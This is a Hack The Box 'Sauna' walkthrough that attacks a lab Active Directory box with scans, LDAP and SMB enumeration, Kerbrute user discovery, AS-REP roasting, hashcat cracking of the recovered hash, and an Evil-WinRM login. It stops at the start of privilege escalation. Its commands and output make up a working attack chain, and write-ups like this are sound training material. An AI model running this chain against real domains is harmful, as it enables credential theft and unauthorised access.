# Hack The Box - Sauna Walkthrough 

The [Forest](https://app.hackthebox.com/machines/Sauna) machine is an easy Windows Machine with a strong focus on Active Directory exploitation. Here, some knowledge about AD and being able to read a Bloodhound graph should be enough to clear the box.

If you didn’t solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.

## Reconnaissance
In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address.


### Nmap Scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.175             
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-15 09:46 EST
Nmap scan report for 10.10.10.175
Host is up (0.25s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-15 21:46:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-15T21:46:48
|_  start_date: N/A
|_clock-skew: 7h00m02s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.20 seconds
```

### Rustscan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ rustscan -a 10.10.10.175 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.175:53
Open 10.10.10.175:80
Open 10.10.10.175:88
Open 10.10.10.175:135
Open 10.10.10.175:139
Open 10.10.10.175:389
Open 10.10.10.175:445
Open 10.10.10.175:464
Open 10.10.10.175:593
Open 10.10.10.175:636
Open 10.10.10.175:3268
Open 10.10.10.175:3269
Open 10.10.10.175:5985
Open 10.10.10.175:9389
Open 10.10.10.175:49667
Open 10.10.10.175:49673
Open 10.10.10.175:49674
Open 10.10.10.175:49675
Open 10.10.10.175:49723
Open 10.10.10.175:49746
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49723,49746 10.10.10.175

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-15 11:04 EST
Initiating Ping Scan at 11:04
Scanning 10.10.10.175 [2 ports]
Completed Ping Scan at 11:04, 0.25s elapsed (1 total hosts)
Initiating Connect Scan at 11:04
Scanning sauna.htb (10.10.10.175) [20 ports]
Discovered open port 53/tcp on 10.10.10.175
Discovered open port 139/tcp on 10.10.10.175
Discovered open port 80/tcp on 10.10.10.175
Discovered open port 445/tcp on 10.10.10.175
Discovered open port 135/tcp on 10.10.10.175
Discovered open port 49673/tcp on 10.10.10.175
Discovered open port 389/tcp on 10.10.10.175
Discovered open port 49674/tcp on 10.10.10.175
Discovered open port 9389/tcp on 10.10.10.175
Discovered open port 3268/tcp on 10.10.10.175
Discovered open port 5985/tcp on 10.10.10.175
Discovered open port 49723/tcp on 10.10.10.175
Discovered open port 49675/tcp on 10.10.10.175
Discovered open port 636/tcp on 10.10.10.175
Discovered open port 3269/tcp on 10.10.10.175
Discovered open port 464/tcp on 10.10.10.175
Discovered open port 49667/tcp on 10.10.10.175
Discovered open port 88/tcp on 10.10.10.175
Discovered open port 593/tcp on 10.10.10.175
Discovered open port 49746/tcp on 10.10.10.175
Completed Connect Scan at 11:04, 0.52s elapsed (20 total ports)
Nmap scan report for sauna.htb (10.10.10.175)
Host is up, received syn-ack (0.26s latency).
Scanned at 2024-01-15 11:04:42 EST for 1s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49723/tcp open  unknown          syn-ack
49746/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

### Enumerating SMB services

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ crackmapexec smb 10.10.10.175                                            
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ crackmapexec smb 10.10.10.175 --shares
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
                                                                                                                                                                        
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ crackmapexec smb 10.10.10.175 -u '' -p ''
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\: STATUS_ACCESS_DENIED

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ crackmapexec smb 10.10.10.175 --shares -u '' -p ''
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\: STATUS_ACCESS_DENIED 
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

### RPCclient

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ rpcclient 10.10.10.175 -U ''
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### Visiting the website

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f349264-17d1-47ec-9240-26782a282c62/3cf9834f-e4e2-4fad-819e-80c02dc43f28/Untitled.png)

trying different extensions (index.php, index.aspx, index.html…etc.) to check which one works.

About.html page has few user which can be used as usernames.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/3f349264-17d1-47ec-9240-26782a282c62/3a53379d-c63b-4bb9-a56a-c6e91cdad0d3/Untitled.png)

```bash
Fergus Smith
Hugo Bear
Steven Kerb
Bowie Taylor
Shaun Colins
Sophie Driver
```

### LDAPsearch

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ ldapsearch -H ldap://10.10.10.175 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ ldapsearch -H ldap://10.10.10.175 -x -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'  
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20240115214335.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 98336
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAAY4t
 hsDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA
 AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4
 TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==
creationTime: 133498286159330070
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 1
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
 ISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
 GOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
 AL-BANK,DC=LOCAL
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
 L-BANK,DC=LOCAL
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
 C=LOCAL
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: EGOTISTICAL-BANK

# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

# Domain Controllers, EGOTISTICAL-BANK.LOCAL
dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

# System, EGOTISTICAL-BANK.LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

# LostAndFound, EGOTISTICAL-BANK.LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

# Infrastructure, EGOTISTICAL-BANK.LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

# Program Data, EGOTISTICAL-BANK.LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
 AL

# search result
search: 2
result: 0 Success

# numResponses: 19
# numEntries: 15
# numReferences: 3
```

### Using Kerbrute to brute-force usernames

```bash
┌──(darshan㉿kali)-[/opt]
└─$ sudo ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/17/24 - Ronnie Flathers @ropnop

2024/01/17 09:50:22 >  Using KDC(s):
2024/01/17 09:50:22 >   10.10.10.175:88

2024/01/17 09:51:08 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2024/01/17 09:55:30 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2024/01/17 09:56:12 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2024/01/17 09:58:37 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
```

Using the same format (fsmith - [first initial][lastname]) to check if other users mentioned on the website exists

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ cat fname.txt                            
fsmith
scoins
sdriver
btayload
hbear
skerb

┌──(darshan㉿kali)-[/opt]
└─$ sudo ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL /home/kali/Desktop/HackTheBox/Windows-boxes/sauna/fname.txt --dc 10.10.10.175 
[sudo] password for darshan: 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/17/24 - Ronnie Flathers @ropnop

2024/01/17 09:58:24 >  Using KDC(s):
2024/01/17 09:58:24 >   10.10.10.175:88

2024/01/17 09:58:24 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2024/01/17 09:58:24 >  Done! Tested 6 usernames (1 valid) in 0.247 seconds
```

### Using [GetNPUsers.py](http://GetNPUsers.py) to perform AS-REP Roasting (When you try to request authentication through Kerberos, first the requesting party has to authenticate itself to the DC. But there is an option, `DONT_REQ_PREAUTH` where the DC will just send the hash to an unauthenticated user. AS-REP Roasting is looking to see if any known users happen to have this option set.) which will give us the hashes used during pre-authentication

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/' -usersfile krb-users.txt -format hashcat -outputfile hashes.aspreroast
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a08ea21852fd0bb3673fd60a75a9926a$18959fc84dd6e5520022b368d90c35bc5c618591c9e6b157b67e77679841dbd99aa2a3a54d80a0e5e561c48eede2518a7a9c396180a8ab109e667d11c3a337c8b4dfe87f23f9d3ba928de4d1ba5cad1f9ca8239663804be84b1dd117741e87ed5a199c738bd160c2944e9fa93e8b399c6985a51a305fbab62accecda54561691524c4c7fc809cab19b72cb8a588e9dd8dea8f521e8697eae132b39d8d21665d3361698acb891406873ad29f92ecc488e7cdbd35bbb9918aeded48db9cbc62b7831b35e69b00a2272bb425df5fc5af7281cb0437791c0a04778f090ee3eaf8d7423a3de746f91f04579d661ed7c5ccc173f6934b1c269b1e98140b055803111fb
$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:041559a51252b61b33615fc87c9f4631$e38eccda72b3e7ef1c73b8344b86ccd3ec05c252db2202353ef64269967cd1b1c5b9b23a0801ec1dd74032cdc602116c1ec07a34133a4190d47b2868db2302d03e8819afb4776cd4ad16462985dc354d2097a7b363812bace2d84a77785f6e3ef3ebf8b89b73d8ab3b9cdb2d2a8adaa422cbc4e37329083d39b767d2889200bad081ad5e9cb4ac23a837094bdc806b66eb4cdc7bcbc5cd7710156460882dad7c2a382bc9f98a24803ec02330c7d7bf96e8253fc55a8f4ac6f8880c52e0b96c4888538042edb204d3219ad73e9cbef1617c7cd38413363144ff7a00beb9d73b10143aed7fb56cac5268e06fda5d998ebc4c6613c2e10e7d89bb0f87a8ee4a520a
[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:1784d4c878856ec38a1c67f00d7edf4b$72dfa6b6c5310e68019710c7495035a1d7e3fe8ecc7b15aa1bb20bab305c41237d1531605ab3ef54bdd1f02022e3ead064dc7152a4aeb89f764f5ecddd33ca2f124f76eeff7ee15df7a8ec6cd516b268c5d35ab4b90f42a3c05c06ba287eedc2564943e5fd853ca49ff2825f2c20038539756871c02bb7bc31356dbef76e944746761d41336a502eda34381a081da8e44c58606193042aab7f09559f9046a6d448f5a64f3c429ea983bb104c3f61ca17822bd3532717d7d7d29d22c4144b9f290e2ec730cf1ce68de528dc0c08cbf887eb11a0c1c2e564583604ed37089c09331d95f4be200f494122cae8306c828bb19cf60a30a202061fdebfb78dd61acd38
$krb5asrep$23$FSMITH@EGOTISTICAL-BANK.LOCAL:558bbc64e45a3f82dff87fe458a03c6c$45b93eb6b7dc7cc18e9846a6ea9720aef7d02314e6bc7488e89d6b0354d9fd44227b2699bb82c6e7e109653eb7dc995af4efd84d68e7ff71e525964e5c12b64969adf312937ac31112a680669d0f3a75db4f197da32c1c2a5383fe290cde47647b678d7c30b48ce21e501ef284185a884d1aa9c4b45368aac91a9f467c5204dfcd85ad8783ea52735551922ef1658c400c22a2d342933575c6510cf89c17c207ee784919426d0483e9016dd26293484b32ce37bbeb3dee714eeed09cb98018572d953b6afebb6cdb84b2a918e508960c17c17ca758c66a3fbb144d4bb04cbce53913bfe823728113685ad7bfd634388f084795d337afa0a70e0ab7a1e40b49a4
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ cat hashes.aspreroast
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5f84f0e3034dbe8f3ffbc9f5c1ebbd8d$b525fe2d7f343cf078d56a6384461a111a37306f7b83ed8b5ac7fd9ad084d50fd755dac07169ba02681f571312c23b8d3b914881f5a6057beed11c968aee060859f2ab981d4f12a0a47d2f6ebc63f7abc166539d9610f1e285da0d02ee98c9bfeeb64129dda0b1cd7aef384f98a710be8b936a50fc54c08d2fcc891ce14912d20004616320ca2983ac14f4bdd0cc4cc40a8514b3761d9b972e30c3655c82b0e0faabaf9a776813cdc6d83c24206d80aa55b378fa06b6ac5bb2dd9f3ae6bddb2476e1e1795f1c62bac9529b0e7265106c1061a641c54faeea205c99926aeddb127b6feb7853aff339e12ed39beda0e8f95aaa2948311aa6a593f994954aa00b08
```

### Cracking the hash using `hashcat`

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force                                                                                                         
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 4800HS with Radeon Graphics, 1441/2947 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5f84f0e3034dbe8f3ffbc9f5c1ebbd8d$b525fe2d7f343cf078d56a6384461a111a37306f7b83ed8b5ac7fd9ad084d50fd755dac07169ba02681f571312c23b8d3b914881f5a6057beed11c968aee060859f2ab981d4f12a0a47d2f6ebc63f7abc166539d9610f1e285da0d02ee98c9bfeeb64129dda0b1cd7aef384f98a710be8b936a50fc54c08d2fcc891ce14912d20004616320ca2983ac14f4bdd0cc4cc40a8514b3761d9b972e30c3655c82b0e0faabaf9a776813cdc6d83c24206d80aa55b378fa06b6ac5bb2dd9f3ae6bddb2476e1e1795f1c62bac9529b0e7265106c1061a641c54faeea205c99926aeddb127b6feb7853aff339e12ed39beda0e8f95aaa2948311aa6a593f994954aa00b08:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5f84f0e...a00b08
Time.Started.....: Wed Jan 17 10:18:04 2024, (17 secs)
Time.Estimated...: Wed Jan 17 10:18:21 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   655.9 kH/s (0.60ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10538496/14344385 (73.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Thip1812 -> Thelittlemermaid
Hardware.Mon.#1..: Util: 20%

Started: Wed Jan 17 10:18:03 2024
Stopped: Wed Jan 17 10:18:23 2024
```

### Using the cracked password to login as `fsmith` through `Evil-WinRM`

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/sauna]
└─$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23                       
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```

### User flag

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
...SNIP...
```

## PrivEsc

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
